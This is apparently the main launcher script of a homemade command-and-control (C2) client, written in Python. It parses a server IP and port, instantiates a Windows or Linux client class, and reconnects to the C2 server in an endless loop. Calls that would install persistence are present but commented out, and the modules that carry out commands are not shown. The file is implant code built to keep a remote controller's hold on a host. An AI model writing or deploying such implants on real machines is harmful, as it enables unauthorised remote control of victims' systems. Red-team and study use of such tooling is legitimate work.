import argparse
import platform

from windowsClient import WindowsClient
from linuxClient import LinuxClient
from time import sleep

DEBUG_MODE = False
SERVER_IP = ""
SERVER_PORT = 0

def update_debug(args):
    if args.debug:
        global DEBUG_MODE
        DEBUG_MODE = True

def update_server_ip(args):
    global SERVER_IP
    SERVER_IP = args.ip

def update_server_port(args):
    global SERVER_PORT
    SERVER_PORT = args.port

def update_global_variables(args):
    update_debug(args)
    update_server_ip(args)
    update_server_port(args)

def parse_args():
    parser = argparse.ArgumentParser(description='Client for the C2')
    parser.add_argument('-d','--debug', help='Enable debug mode', default=False, action='store_true')
    parser.add_argument('--ip', help='Server IP (default: 127.0.0.1)', default='127.0.0.1', type=str)
    parser.add_argument('--port', help='Server Port (default: 8888)', default=8888, type=int)
    args = parser.parse_args()
    update_global_variables(args)

    print("DEBUG_MODE: %s" % DEBUG_MODE)
    print("SERVER_IP: %s" % SERVER_IP)
    print("SERVER_PORT: %d" % SERVER_PORT)

if __name__ == "__main__":
    parse_args()
    if platform.system() == 'Windows':
        client = WindowsClient(SERVER_IP, SERVER_PORT)
        #client.persistence()
    else:
        client = LinuxClient(SERVER_IP, SERVER_PORT)
        #client.persistence()
    while not client.is_killed:
        try:
            client.connect()
        except:
            sleep(3)
            continue
